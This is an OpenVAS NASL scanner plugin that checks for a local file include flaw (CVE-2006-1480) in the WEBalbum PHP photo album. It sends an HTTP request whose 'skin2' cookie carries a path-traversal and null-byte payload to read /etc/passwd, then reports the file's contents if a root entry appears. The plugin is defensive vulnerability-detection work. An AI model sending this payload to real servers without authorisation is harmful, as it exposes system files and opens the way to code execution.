# OpenVAS Vulnerability Test
# $Id: webalbum_local_file_include.nasl 16 2013-10-27 13:09:52Z jan $
# Description: WEBalbum Local File Include Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP application that is affected by a
local file include vulnerability. 

Description :

The remote host is running WEBalbum, a photo album application written
in PHP. 

The installed version of WEBalbum fails to sanitize user input to the
'skin2' cookie in 'inc/inc_main.php' before using it to include
arbitrary files.  An unauthenticated attacker may be able to read
arbitrary local files or include a local file that contains commands
which will be executed on the remote host subject to the privileges of
the web server process. 

This flaw is only exploitable if PHP's 'magic_quotes_gpc' is disabled.";

tag_solution = "Unknown at this time.";

  desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;

if (description) {
  script_id(80094);;
  script_version("$Revision: 16 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_bugtraq_id(17228);
  script_cve_id("CVE-2006-1480");
  script_xref(name:"OSVDB", value:"24160");

  name = "WEBalbum Local File Include Vulnerability";
  script_name(name);
 
  script_description(desc);
 
  summary = "Checks for file includes in index.php";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_family("Web application abuses");

  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/1608");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in index.php to read /etc/passwd.
  req = string(
    "GET /index.php HTTP/1.0\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Cookie: skin2=../../../../../../etc/passwd%00\r\n",
    "\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root
  if ( 'inc_main.php' >< res && egrep(pattern:"root:.*:0:[01]:", string:res) ) 
  {
    content = res - strstr(res, "<br />");

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "OpenVAS was able to read from the remote host :\n",
      "\n",
      content
    );

    security_hole(port:port, data:report);
    exit(0);
  }
}
